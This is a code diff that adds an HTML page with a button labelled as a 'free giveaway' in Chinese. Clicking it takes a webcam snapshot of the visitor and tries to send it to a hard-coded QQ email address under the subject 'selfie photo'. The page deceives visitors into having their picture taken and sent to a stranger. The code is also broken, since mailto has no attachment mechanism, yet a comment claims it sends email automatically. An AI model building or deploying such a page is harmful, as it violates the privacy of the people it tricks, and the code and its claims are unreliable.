@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<body>
+<video id="video" autoplay></video>
+<button onclick="capture()">免费赠送</button>
+
+<script>
+// 调用摄像头
+navigator.mediaDevices.getUserMedia({ video: true })
+  .then(stream => document.getElementById('video').srcObject = stream);
+
+async function capture() {
+  // 拍照转Base64
+  const canvas = document.createElement('canvas');
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  canvas.getContext('2d').drawImage(video, 0, 0);
+  const image = canvas.toDataURL('image/jpeg');
+
+  // 自动发送邮件（无需后端）
+  const mailtoLink = `mailto:1503056753@qq.com?subject=自拍照片&body=图片已拍摄&attachment=${image}`;
+  window.location.href = mailtoLink;
+}
+</script>
+</body>
+</html>
